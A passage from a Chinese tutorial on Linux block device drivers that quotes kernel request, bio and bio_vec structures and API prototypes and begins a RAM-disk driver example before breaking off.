<pre><code class="prism language-c"><span class="token keyword">struct</span> <span class="token class-name">request_queue</span> <span class="token operator">*</span><span class="token function">blk_init_queue</span><span class="token punctuation">(</span>request_fn_proc <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token class-name">spinlock_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>2、删除请求队列</p> 
<pre><code class="prism language-c"><span class="token keyword">void</span> <span class="token function">blk_cleanup_queue</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">request_queue</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>3、制造请求函数</p> 
<pre><code class="prism language-c"><span class="token keyword">void</span> <span class="token function">blk_queue_make_request</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">request_queue</span> <span class="token operator">*</span><span class="token punctuation">,</span> make_request_fn <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<h2>
<a id="6_406"></a>6、请求项</h2> 
<pre><code class="prism language-c"><span class="token comment">/*
 * Try to put the fields that are referenced together in the same cacheline.
 *
 * If you modify this structure, make sure to update blk_rq_init() and
 * especially blk_mq_rq_ctx_init() to take care of the added fields.
 */</span>
<span class="token keyword">struct</span> <span class="token class-name">request</span> <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">struct</span> <span class="token class-name">list_head</span> queuelist<span class="token punctuation">;</span>
	<span class="token keyword">union</span> <span class="token punctuation">{<!-- --></span>
		<span class="token keyword">struct</span> <span class="token class-name">call_single_data</span> csd<span class="token punctuation">;</span>
		<span class="token keyword">unsigned</span> <span class="token keyword">long</span> fifo_time<span class="token punctuation">;</span>
	<span class="token punctuation">}</span><span class="token punctuation">;</span>

	<span class="token keyword">struct</span> <span class="token class-name">request_queue</span> <span class="token operator">*</span>q<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">blk_mq_ctx</span> <span class="token operator">*</span>mq_ctx<span class="token punctuation">;</span>

	u64 cmd_flags<span class="token punctuation">;</span>
	<span class="token keyword">enum</span> <span class="token class-name">rq_cmd_type_bits</span> cmd_type<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> atomic_flags<span class="token punctuation">;</span>

	<span class="token keyword">int</span> cpu<span class="token punctuation">;</span>

	<span class="token comment">/* the following two fields are internal, NEVER access directly */</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> __data_len<span class="token punctuation">;</span>	<span class="token comment">/* total data len */</span>
	<span class="token class-name">sector_t</span> __sector<span class="token punctuation">;</span>		<span class="token comment">/* sector cursor */</span>

	<span class="token keyword">struct</span> <span class="token class-name">bio</span> <span class="token operator">*</span>bio<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">bio</span> <span class="token operator">*</span>biotail<span class="token punctuation">;</span>

	<span class="token comment">/*
	 * The hash is used inside the scheduler, and killed once the
	 * request reaches the dispatch list. The ipi_list is only used
	 * to queue the request for softirq completion, which is long
	 * after the request has been unhashed (and even removed from
	 * the dispatch list).
	 */</span>
	<span class="token keyword">union</span> <span class="token punctuation">{<!-- --></span>
		<span class="token keyword">struct</span> <span class="token class-name">hlist_node</span> hash<span class="token punctuation">;</span>	<span class="token comment">/* merge hash */</span>
		<span class="token keyword">struct</span> <span class="token class-name">list_head</span> ipi_list<span class="token punctuation">;</span>
	<span class="token punctuation">}</span><span class="token punctuation">;</span>

	<span class="token comment">/*
	 * The rb_node is only used inside the io scheduler, requests
	 * are pruned when moved to the dispatch queue. So let the
	 * completion_data share space with the rb_node.
	 */</span>
	<span class="token keyword">union</span> <span class="token punctuation">{<!-- --></span>
		<span class="token keyword">struct</span> <span class="token class-name">rb_node</span> rb_node<span class="token punctuation">;</span>	<span class="token comment">/* sort/lookup */</span>
		<span class="token keyword">void</span> <span class="token operator">*</span>completion_data<span class="token punctuation">;</span>
	<span class="token punctuation">}</span><span class="token punctuation">;</span>

	<span class="token comment">/*
	 * Three pointers are available for the IO schedulers, if they need
	 * more they have to dynamically allocate it.  Flush requests are
	 * never put on the IO scheduler. So let the flush fields share
	 * space with the elevator data.
	 */</span>
	<span class="token keyword">union</span> <span class="token punctuation">{<!-- --></span>
		<span class="token keyword">struct</span> <span class="token punctuation">{<!-- --></span>
			<span class="token keyword">struct</span> <span class="token class-name">io_cq</span>		<span class="token operator">*</span>icq<span class="token punctuation">;</span>
			<span class="token keyword">void</span>			<span class="token operator">*</span>priv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span> elv<span class="token punctuation">;</span>

		<span class="token keyword">struct</span> <span class="token punctuation">{<!-- --></span>
			<span class="token keyword">unsigned</span> <span class="token keyword">int</span>		seq<span class="token punctuation">;</span>
			<span class="token keyword">struct</span> <span class="token class-name">list_head</span>	list<span class="token punctuation">;</span>
			rq_end_io_fn		<span class="token operator">*</span>saved_end_io<span class="token punctuation">;</span>
		<span class="token punctuation">}</span> flush<span class="token punctuation">;</span>
	<span class="token punctuation">}</span><span class="token punctuation">;</span>

	<span class="token keyword">struct</span> <span class="token class-name">gendisk</span> <span class="token operator">*</span>rq_disk<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">hd_struct</span> <span class="token operator">*</span>part<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> start_time<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_BLK_CGROUP</span></span>
	<span class="token keyword">struct</span> <span class="token class-name">request_list</span> <span class="token operator">*</span>rl<span class="token punctuation">;</span>		<span class="token comment">/* rl this rq is alloced from */</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> start_time_ns<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> io_start_time_ns<span class="token punctuation">;</span>    <span class="token comment">/* when passed to hardware */</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
	<span class="token comment">/* Number of scatter-gather DMA addr+len pairs after
	 * physical address coalescing is performed.
	 */</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">short</span> nr_phys_segments<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token function">defined</span><span class="token punctuation">(</span>CONFIG_BLK_DEV_INTEGRITY<span class="token punctuation">)</span></span></span>
	<span class="token keyword">unsigned</span> <span class="token keyword">short</span> nr_integrity_segments<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>

	<span class="token keyword">unsigned</span> <span class="token keyword">short</span> ioprio<span class="token punctuation">;</span>

	<span class="token keyword">void</span> <span class="token operator">*</span>special<span class="token punctuation">;</span>		<span class="token comment">/* opaque pointer available for LLD use */</span>

	<span class="token keyword">int</span> tag<span class="token punctuation">;</span>
	<span class="token keyword">int</span> errors<span class="token punctuation">;</span>

	<span class="token comment">/*
	 * when request is used as a packet command carrier
	 */</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">char</span> __cmd<span class="token punctuation">[</span>BLK_MAX_CDB<span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>cmd<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">short</span> cmd_len<span class="token punctuation">;</span>

	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> extra_len<span class="token punctuation">;</span>	<span class="token comment">/* length of alignment and padding */</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> sense_len<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> resid_len<span class="token punctuation">;</span>	<span class="token comment">/* residual count */</span>
	<span class="token keyword">void</span> <span class="token operator">*</span>sense<span class="token punctuation">;</span>

	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> deadline<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">list_head</span> timeout_list<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> timeout<span class="token punctuation">;</span>
	<span class="token keyword">int</span> retries<span class="token punctuation">;</span>

	<span class="token comment">/*
	 * completion callback.
	 */</span>
	rq_end_io_fn <span class="token operator">*</span>end_io<span class="token punctuation">;</span>
	<span class="token keyword">void</span> <span class="token operator">*</span>end_io_data<span class="token punctuation">;</span>

	<span class="token comment">/* for bidi */</span>
	<span class="token keyword">struct</span> <span class="token class-name">request</span> <span class="token operator">*</span>next_rq<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> 
<p>1、获取请求</p> 
<pre><code class="prism language-c"><span class="token keyword">struct</span> <span class="token class-name">request</span> <span class="token operator">*</span><span class="token function">blk_peek_request</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">request_queue</span> <span class="token operator">*</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>2、开启请求</p> 
<pre><code class="prism language-c"><span class="token keyword">void</span> <span class="token function">blk_start_request</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">request</span> <span class="token operator">*</span>req<span class="token punctuation">)</span>
</code></pre> 
<p>3、获取、开启请求</p> 
<pre><code class="prism language-c"><span class="token keyword">struct</span> <span class="token class-name">request</span> <span class="token operator">*</span><span class="token function">blk_fetch_request</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">request_queue</span> <span class="token operator">*</span>q<span class="token punctuation">)</span>
</code></pre> 
<h2>
<a id="7bio_548"></a>7、bio</h2> 
<pre><code class="prism language-c"><span class="token comment">/*
 * main unit of I/O for the block layer and lower layers (ie drivers and
 * stacking drivers)
 */</span>
<span class="token keyword">struct</span> <span class="token class-name">bio</span> <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">struct</span> <span class="token class-name">bio</span>		<span class="token operator">*</span>bi_next<span class="token punctuation">;</span>	<span class="token comment">/* request queue link */</span>
	<span class="token keyword">struct</span> <span class="token class-name">block_device</span>	<span class="token operator">*</span>bi_bdev<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">long</span>		bi_flags<span class="token punctuation">;</span>	<span class="token comment">/* status, command, etc */</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">long</span>		bi_rw<span class="token punctuation">;</span>		<span class="token comment">/* bottom bits READ/WRITE,
						 * top bits priority
						 */</span>

	<span class="token keyword">struct</span> <span class="token class-name">bvec_iter</span>	bi_iter<span class="token punctuation">;</span>

	<span class="token comment">/* Number of segments in this BIO after
	 * physical address coalescing is performed.
	 */</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>		bi_phys_segments<span class="token punctuation">;</span>

	<span class="token comment">/*
	 * To keep track of the max segment size, we account for the
	 * sizes of the first and last mergeable segments in this bio.
	 */</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>		bi_seg_front_size<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>		bi_seg_back_size<span class="token punctuation">;</span>

	<span class="token class-name">atomic_t</span>		bi_remaining<span class="token punctuation">;</span>

	<span class="token class-name">bio_end_io_t</span>		<span class="token operator">*</span>bi_end_io<span class="token punctuation">;</span>

	<span class="token keyword">void</span>			<span class="token operator">*</span>bi_private<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_BLK_CGROUP</span></span>
	<span class="token comment">/*
	 * Optional ioc and css associated with this bio.  Put on bio
	 * release.  Read comment on top of bio_associate_current().
	 */</span>
	<span class="token keyword">struct</span> <span class="token class-name">io_context</span>	<span class="token operator">*</span>bi_ioc<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">cgroup_subsys_state</span> <span class="token operator">*</span>bi_css<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
	<span class="token keyword">union</span> <span class="token punctuation">{<!-- --></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token function">defined</span><span class="token punctuation">(</span>CONFIG_BLK_DEV_INTEGRITY<span class="token punctuation">)</span></span></span>
		<span class="token keyword">struct</span> <span class="token class-name">bio_integrity_payload</span> <span class="token operator">*</span>bi_integrity<span class="token punctuation">;</span> <span class="token comment">/* data integrity */</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
	<span class="token punctuation">}</span><span class="token punctuation">;</span>

	<span class="token keyword">unsigned</span> <span class="token keyword">short</span>		bi_vcnt<span class="token punctuation">;</span>	<span class="token comment">/* how many bio_vec's */</span>

	<span class="token comment">/*
	 * Everything starting with bi_max_vecs will be preserved by bio_reset()
	 */</span>

	<span class="token keyword">unsigned</span> <span class="token keyword">short</span>		bi_max_vecs<span class="token punctuation">;</span>	<span class="token comment">/* max bvl_vecs we can hold */</span>

	<span class="token class-name">atomic_t</span>		bi_cnt<span class="token punctuation">;</span>		<span class="token comment">/* pin count */</span>

	<span class="token keyword">struct</span> <span class="token class-name">bio_vec</span>		<span class="token operator">*</span>bi_io_vec<span class="token punctuation">;</span>	<span class="token comment">/* the actual vec list */</span>

	<span class="token keyword">struct</span> <span class="token class-name">bio_set</span>		<span class="token operator">*</span>bi_pool<span class="token punctuation">;</span>

	<span class="token comment">/*
	 * We can inline a number of vecs at the end of the bio, to avoid
	 * double allocations for a small number of bio_vecs. This member
	 * MUST obviously be kept at the very end of the bio.
	 */</span>
	<span class="token keyword">struct</span> <span class="token class-name">bio_vec</span>		bi_inline_vecs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> 
<p>1、遍历 <code>bio</code></p> 
<pre><code class="prism language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">__rq_for_each_bio</span><span class="token expression"><span class="token punctuation">(</span>_bio<span class="token punctuation">,</span> rq<span class="token punctuation">)</span></span></span>
</code></pre> 
<p>2、遍历 <code>bio</code> 中所有段</p> 
<pre><code class="prism language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">bio_for_each_segment</span><span class="token expression"><span class="token punctuation">(</span>bvl<span class="token punctuation">,</span> bio<span class="token punctuation">,</span> iter<span class="token punctuation">)</span></span></span>
</code></pre> 
<p>3、通知 <code>bio</code> 处理结束</p> 
<pre><code class="prism language-c">bvoid <span class="token function">bio_endio</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">bio</span> <span class="token operator">*</span>bio<span class="token punctuation">,</span> <span class="token keyword">int</span> error<span class="token punctuation">)</span>
</code></pre> 
<h2>
<a id="8bvec_iter_639"></a>8、硬件信息(bvec_iter)</h2> 
<pre><code class="prism language-c"><span class="token keyword">struct</span> <span class="token class-name">bvec_iter</span> <span class="token punctuation">{<!-- --></span>
	<span class="token class-name">sector_t</span>		bi_sector<span class="token punctuation">;</span>	<span class="token comment">/* device address in 512 byte
						   sectors */</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>		bi_size<span class="token punctuation">;</span>	<span class="token comment">/* residual I/O count */</span>

	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>		bi_idx<span class="token punctuation">;</span>		<span class="token comment">/* current index into bvl_vec */</span>

	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>            bi_bvec_done<span class="token punctuation">;</span>	<span class="token comment">/* number of bytes completed in
						   current bvec */</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> 
<h2>
<a id="9bio_vec_654"></a>9、bio_vec</h2> 
<pre><code class="prism language-c"><span class="token comment">/*
 * was unsigned short, but we might as well be ready for &gt; 64kB I/O pages
 */</span>
<span class="token keyword">struct</span> <span class="token class-name">bio_vec</span> <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">struct</span> <span class="token class-name">page</span>	<span class="token operator">*</span>bv_page<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>	bv_len<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>	bv_offset<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> 
<h2>
<a id="10bio_667"></a>10、bio逻辑架构</h2> 
<p><img src="https://images2.imgbox.com/7e/d1/Wzue0Go2_o.png" alt="在这里插入图片描述"></p> 
<h2>
<a id="11request_queuerequestbio_669"></a>11、request_queue、request和bio关系</h2> 
<p><img src="https://images2.imgbox.com/8a/be/w4Pwzytd_o.png" alt="在这里插入图片描述"></p> 
<h1>
<a id="_671"></a>五、内存模拟硬盘驱动编写(使用内核请求队列)</h1> 
<p>参考：<code>driversblockz2ram.c</code>。</p> 
<h2>
<a id="1_675"></a>1、编写思路</h2> 
<p>1、从 <code>RAM</code> 中分配内存。</p> 
<p>2、注册逻辑块设备，为应用层提供操作对象。</p> 
<p>3、初始化请求队列。</p> 
<p>4、添加、初始化实际块设备，为驱动提供操作对象。</p> 
<p>5、通过注册的请求队列函数进行数据传输（可以使用内核提供，也可以自己进行构造）。</p> 
<h2>
<a id="2_687"></a>2、驱动实现</h2> 
<pre><code class="prism language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"linux/init.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"linux/module.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"linux/slab.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"linux/spinlock_types.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"linux/fs.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"linux/genhd.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"linux/hdreg.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"linux/blkdev.h"</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">RAMDISK_SIZE</span>	<span class="token expression"><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">)</span> 	</span><span class="token comment">/* 容量大小为2MB */</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">RAMDISK_NAME</span>	<span class="token string">"ramdisk"</span>			<span class="token comment">/* 名字 */</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">RADMISK_MINOR</span>	<span class="token expression"><span class="token number">3</span>					</span><span class="token comment">/* 表示有三个磁盘分区！不是次设备号为3！ */</span></span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>ramdiskbuf<span class="token punctuation">;</span>	<span class="token comment">/* ramdisk内存空间,用于模拟块设备 */</span>
    <span class="token class-name">spinlock_t</span> lock<span class="token punctuation">;</span>			<span class="token comment">/* 自旋锁 */</span>
    <span class="token keyword">int</span> major<span class="token punctuation">;</span>					<span class="token comment">/* 主设备号 */</span>
    <span class="token keyword">struct</span> <span class="token class-name">request_queue</span> <span class="token operator">*</span>queue<span class="token punctuation">;</span><span class="token comment">/* 请求队列 */</span>
    <span class="token keyword">struct</span> <span class="token class-name">gendisk</span> <span class="token operator">*</span>gendisk<span class="token punctuation">;</span> 	<span class="token comment">/* gendisk */</span>
<span class="token punctuation">}</span><span class="token class-name">newchrdev_t</span><span class="token punctuation">;</span>
<span class="token class-name">newchrdev_t</span> newchrdev<span class="token punctuation">;</span>

<span class="token comment">/*
 * @description		: 打开块设备
 * @param - dev 	: 块设备
 * @param - mode 	: 打开模式
 * @return 			: 0 成功;其他 失败
 */</span>
<span class="token keyword">int</span> <span class="token function">ramdisk_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">block_device</span> <span class="token operator">*</span>dev<span class="token punctuation">,</span> <span class="token class-name">fmode_t</span> mode<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"ramdisk openrn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">/*
 * @description		: 释放块设备
 * @param - disk 	: gendisk
 * @param - mode 	: 模式
 * @return 			: 0 成功;其他 失败
 */</span>
<span class="token keyword">void</span> <span class="token function">ramdisk_release</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">gendisk</span> <span class="token operator">*</span>disk<span class="token punctuation">,</span> <span class="token class-name">fmode_t</span> mode<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"ramdisk releasern"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">/*
 * @description		: 获取磁盘信息
 * @param - dev 	: 块设备
 * @param - geo 	: 模式
 * @return 			: 0 成功;其他 失败
 */</span>
<span class="token keyword">int</span> <span class="token function">ramdisk_getgeo</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">block_device</span> <span class="token operator">*</span>dev<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">hd_geometry</span> <span class="token operator">*</span>geo<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token comment">/* 这是相对于机械硬盘的概念 */</span>
	geo<span class="token operator">-&gt;</span>heads <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>			<span class="token comment">/* 磁头 */</span>
	geo<span class="token operator">-&gt;</span>cylinders <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>	<span class="token comment">/* 柱面 */</span>
	geo<span class="token operator">-&gt;</span>sectors <span class="token operator">=</span> RAMDISK_SIZE <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token number">32</span> <span class="token operator">*</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* 一个磁道上的扇区数量 */</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">/* 
 * 块设备操作函数 
 */</span>
<span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">block_device_operations</span> ramdisk_fops <span class="token operator">=</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token punctuation">.</span>owner	 <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">,</span>
	<span class="token punctuation">.</span>open	 <span class="token operator">=</span> ramdisk_open<span class="token punctuation">,</span>
	<span class="token punctuation">.</span>release <span class="token operator">=</span> ramdisk_release<span class="token punctuation">,</span>
	<span class="token punctuation">.</span>getgeo  <span class="token operator">=</span> ramdisk_getgeo<span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">/*
 * @description	: 处理传输过程
 * @param-req 	: 请求
 * @return 		: 无
 */</span>
<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">ramdisk_transfer</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">request</span> <span class="token operator">*</span>req<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>	
	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> start <span class="token operator">=</span> <span class="token function">blk_rq_pos</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">9</span><span class="token punctuation">;</span>  	<span class="token comment">/* blk_rq_pos获取到的是扇区地址，左移9位转换为字节地址 */</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> len  <span class="token operator">=</span> <span class="token function">blk_rq_cur_bytes</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment">/* 大小   */</span>

	<span class="token comment">/* bio中的数据缓冲区
	 * 读：从磁盘读取到的数据存放到buffer中
	 * 写：buffer保存这要写入磁盘的数据
	 */</span>
	<span class="token keyword">void</span> <span class="token operator">*</span>buffer <span class="token operator">=</span> <span class="token function">bio_data</span><span class="token punctuation">(</span>req<span class="token operator">-&gt;</span>bio<span class="token punctuation">)</span><span class="token punctuation">;</span>		
	
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">rq_data_dir</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token operator">==</span> READ<span class="token punctuation">)</span> 		<span class="token comment">/* 读数据 */</span>
        <span class="token comment">/* 不同块设备，具体操作不同，RAM才可以使用memcpy进行处理 */</span>
		<span class="token function">memcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> newchrdev<span class="token punctuation">.</span>ramdiskbuf <span class="token operator">+</span> start<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">rq_data_dir</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token operator">==</span> WRITE<span class="token punctuation">)</span> 	<span class="token comment">/* 写数据 */</span>
		<span class="token function">memcpy</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>ramdiskbuf <span class="token operator">+</span> start<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token comment">/*
 * @description	: 请求处理函数
 * @param-q 	: 请求队列
 * @return 		: 无
 */</span>
<span class="token keyword">void</span> <span class="token function">ramdisk_request_fn</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">request_queue</span> <span class="token operator">*</span>q<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> err <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">request</span> <span class="token operator">*</span>req<span class="token punctuation">;</span>

	<span class="token comment">/* 循环处理请求队列中的每个请求 */</span>
	req <span class="token operator">=</span> <span class="token function">blk_fetch_request</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">while</span><span class="token punctuation">(</span>req <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>

		<span class="token comment">/* 针对请求做具体的传输处理 */</span>
		<span class="token function">ramdisk_transfer</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">/* 判断是否为最后一个请求，如果不是的话就获取下一个请求
		 * 循环处理完请求队列中的所有请求。
		 */</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">__blk_end_request_cur</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">)</span>
			req <span class="token operator">=</span> <span class="token function">blk_fetch_request</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">/*
 * @description	: 驱动出口函数
 * @param 		: 无
 * @return 		: 无
 */</span>
<span class="token keyword">static</span> <span class="token keyword">int</span> __init <span class="token function">ramdisk_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"ramdisk initrn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">/* 1、申请用于ramdisk内存 */</span>
	newchrdev<span class="token punctuation">.</span>ramdiskbuf <span class="token operator">=</span> <span class="token function">kzalloc</span><span class="token punctuation">(</span>RAMDISK_SIZE<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>ramdiskbuf <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		ret <span class="token operator">=</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>
		<span class="token keyword">goto</span> ram_fail<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

    <span class="token comment">/* 2、初始化自旋锁 */</span>
	<span class="token function">spin_lock_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>newchrdev<span class="token punctuation">.</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* 3、注册块设备(逻辑块设备：为应用层提供一个操作对象) */</span>
